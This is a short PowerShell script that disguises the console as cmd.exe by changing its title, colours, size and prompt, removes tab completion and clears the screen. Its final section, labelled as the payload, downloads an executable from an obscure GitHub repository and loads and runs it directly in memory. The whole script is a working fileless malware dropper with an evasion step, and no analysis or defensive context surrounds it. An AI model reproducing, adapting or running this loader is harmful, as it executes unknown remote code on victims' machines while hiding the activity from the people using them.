# Change console to look like CMD
$Host.UI.RawUI.WindowTitle = "cmd.exe"
$Host.UI.RawUI.ForegroundColor = "Gray"
$Host.UI.RawUI.BackgroundColor = "Black"
Clear-Host

# Set console size like default CMD
$Host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(120, 30)
$Host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(120, 9999)

# Change prompt to look like CMD
function prompt { "C:\Users\$env:USERNAME>" }

# Disable PowerShell features
Remove-Item function:tabexp2 -ErrorAction SilentlyContinue
Remove-Item function:TabExpansion -ErrorAction SilentlyContinue

# Clear any PowerShell specific output
Clear-Host

# Run the payload
$bytes = (New-Object System.Net.WebClient).DownloadData(
    "https://github.com/ousdhfoudhoudhgiu/45yh/raw/refs/heads/main/MemoryModule.net.exe"
)

$asm = [System.Reflection.Assembly]::Load($bytes)
$asm.EntryPoint.Invoke($null, $null)
